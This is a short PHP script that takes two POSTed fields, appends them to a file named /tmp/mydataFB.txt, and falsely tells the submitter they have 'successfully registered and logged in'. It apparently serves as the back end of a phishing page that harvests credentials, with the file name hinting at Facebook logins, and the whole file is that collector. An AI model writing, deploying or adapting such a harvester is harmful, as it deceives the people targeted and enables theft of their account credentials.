<?php
if(isset($_POST['key1']) && isset($_POST['key2'])) {
    $data = $_POST['key1'] . '-' . $_POST['key2'] . "\n";
    $ret = file_put_contents('/tmp/mydataFB.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "You have successfully registered and logged in.";
    }
}
else {
   die('no post data to process');
}
?>
